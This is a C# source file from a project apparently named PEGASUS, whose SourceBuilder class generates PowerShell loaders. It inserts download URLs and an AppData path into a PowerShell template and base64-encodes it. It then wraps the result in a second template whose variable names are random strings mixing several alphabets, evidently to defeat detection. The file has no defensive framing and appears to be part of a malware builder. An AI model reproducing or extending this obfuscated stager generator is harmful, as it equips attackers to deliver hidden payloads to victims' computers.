using System;
using System.Linq;
using System.Text;
using PEGASUS.Properties;

namespace PEGASUS.Loader
	{
internal class SourceBuilder
{
	private static Random random = new Random();

	public static string RandomString(int length)
	{
		return new string((from s in Enumerable.Repeat("ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζηθικλμνξοπρστυφχψωABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي0123456789艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת", length)
						   select s[random.Next(s.Length)]).ToArray());
	}

	public string Build(Config config)
	{
		string powersrc = Resources.powersrc;
		powersrc = powersrc.Replace(config.GetReplacementName("URL2"), config.URL2);
		powersrc = powersrc.Replace(config.GetReplacementName("Namespace"), config.Namespace);
		powersrc = powersrc.Replace(config.GetReplacementName("Classname"), config.Classname);
		powersrc = powersrc.Replace(config.GetReplacementName("MethodName"), config.MethodName);
		powersrc = powersrc.Replace(config.GetReplacementName("MethodName3"), config.MethodName3);
		powersrc = powersrc.Replace(config.GetReplacementName("MethodName2"), config.MethodName2);
		powersrc = powersrc.Replace(config.GetReplacementName("ApplicationData"), config.ApplicationData);
		powersrc = powersrc.Replace(config.GetReplacementName("DirectURL"), config.DirectURL);
		LoaderConfig loaderConfig = new LoaderConfig();
		loaderConfig.MethodName = config.MethodName;
		loaderConfig.Namespace = config.Namespace;
		loaderConfig.Classname = config.Classname;
		loaderConfig.Base64Data = Convert.ToBase64String(Encoding.UTF8.GetBytes(powersrc));
		loaderConfig.Encoded = "$" + RandomString(34);
		loaderConfig.Decoded = "$" + RandomString(34);
		loaderConfig.Instance = "$" + RandomString(34);
		return Resources.loader.Replace(loaderConfig.GetReplacementName("MethodName"), loaderConfig.MethodName).Replace(loaderConfig.GetReplacementName("Namespace"), loaderConfig.Namespace).Replace(loaderConfig.GetReplacementName("Base64Data"), loaderConfig.Base64Data)
			.Replace(loaderConfig.GetReplacementName("Classname"), loaderConfig.Classname)
			.Replace(loaderConfig.GetReplacementName("Encoded"), loaderConfig.Encoded)
			.Replace(loaderConfig.GetReplacementName("Decoded"), loaderConfig.Decoded)
			.Replace(loaderConfig.GetReplacementName("Instance"), loaderConfig.Instance);
	}

	private string GetReplacementPropertyName(string property)
	{
		return GetAttribute(typeof(Config), property).Name;
	}

	private ReplacementAttribute GetAttribute(Type t, string property)
	{
		return (ReplacementAttribute)Attribute.GetCustomAttribute(t.GetProperty(property), typeof(ReplacementAttribute));
	}
}
}